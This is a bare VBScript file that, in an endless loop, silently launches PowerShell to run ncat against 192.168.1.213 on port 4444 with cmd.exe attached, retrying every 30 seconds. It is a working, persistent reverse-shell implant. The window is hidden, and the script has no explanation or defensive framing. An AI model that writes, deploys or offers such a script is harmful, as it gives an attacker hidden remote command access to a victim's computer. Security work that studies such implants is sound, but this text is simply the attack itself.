Do While True
	Set oShell = CreateObject("Wscript.Shell")
	oShell.run "powershell.exe -Command ""'ncat 192.168.1.213 4444 -e cmd.exe'| cmd""", 0, True
	WScript.Sleep 30000
Loop
